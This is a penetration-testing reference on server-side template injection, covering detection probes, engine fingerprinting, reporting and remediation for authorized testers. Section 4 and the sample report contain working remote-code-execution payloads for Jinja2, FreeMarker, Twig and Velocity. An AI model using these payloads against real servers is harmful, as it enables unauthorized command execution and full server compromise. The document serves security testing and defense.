# Server-Side Template Injection (SSTI) Testing Notes — Offensive Security Reference

## 1. Root Cause
SSTI occurs when user input is embedded into a server-side template (Jinja2, Twig, FreeMarker, Velocity, Handlebars, ERB, Smarty, etc.) and then *evaluated by the template engine itself* rather than treated as inert data. Because template languages are often full expression languages with access to underlying objects and sometimes the runtime environment, SSTI frequently escalates all the way to remote code execution — it's one of the highest-impact bug classes when found.

## 2. Where to Look
Anywhere user input might be concatenated directly into a template string rather than passed as a template *variable*:
- Email/notification template customization features ("edit your welcome email")
- PDF/document generation from user-supplied content
- Dynamic page/report builders
- Error message customization or "custom 404 page" features
- Any feature advertising template/merge-field support (`{{name}}`-style personalization)

## 3. Detection Methodology

**Step 1 — Basic polyglot probe.** Submit a payload that's valid syntax across multiple common engines simultaneously to see which fires:
```
${7*7}{{7*7}}<%= 7*7 %>#{7*7}
```
If any `49` appears in the output, note which syntax triggered it — that identifies the engine family.

**Step 2 — Confirm it's injection, not just reflection.** Test `{{7*7}}` (evaluates to 49) against `{{7*'7'}}` — in Jinja2 this produces `7777777` (Python string multiplication) rather than an error, which confirms genuine expression evaluation, not simple text reflection.

**Step 3 — Engine-specific fingerprinting once confirmed:**
- **Jinja2 (Python/Flask):** `{{7*7}}` → 49; distinguishing marker: `{{7*'7'}}` → `7777777`
- **Twig (PHP/Symfony):** `{{7*7}}` → 49; distinguishing marker: `{{7*'7'}}` → error (no implicit string coercion) — helps distinguish from Jinja2
- **FreeMarker (Java):** `${7*7}` → 49
- **Velocity (Java):** `#set($x=7*7)$x` → 49
- **Handlebars (JS):** typically sandboxed by default — test for prototype pollution via helpers instead
- **ERB (Ruby):** `<%= 7*7 %>` → 49

## 4. Exploitation — From Detection to RCE

**Jinja2 (most commonly targeted in the wild):**
```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```
or via the classic object-traversal chain when `__globals__` access is filtered:
```
{{ ''.__class__.__mro__[1].__subclasses__() }}
```
— walk the subclasses list to find one that provides file/process access (e.g., a subprocess-related class) and instantiate it.

**FreeMarker:**
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

**Twig:**
```
{{ ['id'] | filter('system') }}
```
(technique depends on available filters/functions exposed to the sandbox; adjust based on Twig version and sandboxing configuration)

**Velocity:**
```
#set($e="e")
$e.getClass().forName("java.lang.Runtime").getMethod("exec",$e.getClass().forName("java.lang.String")).invoke($e.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke($null),"id")
```

The exact chain always depends on the specific engine version, whether a sandbox is applied, and what's exposed to the template context — expect to iterate rather than expect a single universal payload to work.

## 5. Sandboxed Engines
Many modern frameworks apply a sandbox restricting attribute/method access (e.g., Jinja2's `SandboxedEnvironment`, Twig's sandbox extension). Test specifically for sandbox escape techniques relevant to the engine/version in use — these are frequently disclosed as CVEs against specific engine versions, so identifying exact version is worth the effort before assuming RCE isn't reachable.

## 6. Tools
| Tool | Use |
|---|---|
| **tplmap** | Automated SSTI detection and exploitation across multiple engines |
| **Burp Suite** | Manual polyglot probing and response diffing via Repeater |

## 7. Checklist
- [ ] Polyglot probe tested against every input reaching any templated output (not just obviously "template-like" features)
- [ ] Reflection vs. genuine evaluation confirmed (arithmetic/string-coercion test)
- [ ] Engine fingerprinted via distinguishing syntax markers
- [ ] Sandbox presence tested before assuming full RCE is reachable
- [ ] Escalation attempted from confirmed evaluation to file read / command execution
- [ ] Engine version identified and checked against known public sandbox-escape CVEs

## 8. Severity Notes
Confirmed RCE via SSTI → Critical, always — full server compromise. Confirmed expression evaluation without demonstrated RCE (e.g., sandboxed engine resisting escape attempts) → still High, since sandbox escapes are frequently found later and the underlying design flaw remains.

## 9. Sample Reporting Language
**Finding title:** Server-Side Template Injection Leading to Remote Code Execution in Email Template Editor

**Description:** The custom email template editor renders user-supplied content through the Jinja2 template engine without restricting it to a safe variable context. A payload of `{{7*7}}` evaluated to `49` in the resulting rendered email, and further testing confirmed full code execution via `{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}`, which returned the output of the `id` command executed on the application server.

**Impact:** An attacker with access to the template editor feature can execute arbitrary operating system commands on the application server, resulting in full server compromise.

**Recommendation:** Do not render user-supplied content through a full template engine. If template customization must be supported, use a logic-less templating approach (e.g., simple variable substitution without expression evaluation) or a strictly sandboxed environment with an allowlist of exposed variables and no access to underlying class/object introspection.

---
*Assumes testing under written authorization. RCE confirmation commands should be limited to non-destructive, clearly-scoped commands (`id`, `whoami`, `hostname`) — avoid any command with side effects without explicit client sign-off.*
